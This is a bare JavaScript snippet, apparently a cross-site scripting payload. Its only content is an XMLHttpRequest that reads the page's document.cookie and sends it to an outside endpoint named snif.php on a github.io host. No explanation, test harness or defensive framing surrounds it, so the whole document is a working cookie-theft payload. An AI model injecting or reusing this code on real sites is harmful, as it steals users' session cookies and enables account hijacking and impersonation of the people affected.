var xmlHttp = new XMLHttpRequest();
 xmlHttp.open("GET", 'https://ef3tr.github.io/xss/snif.php?cookie='+document.cookie);
 xmlHttp.send(null);
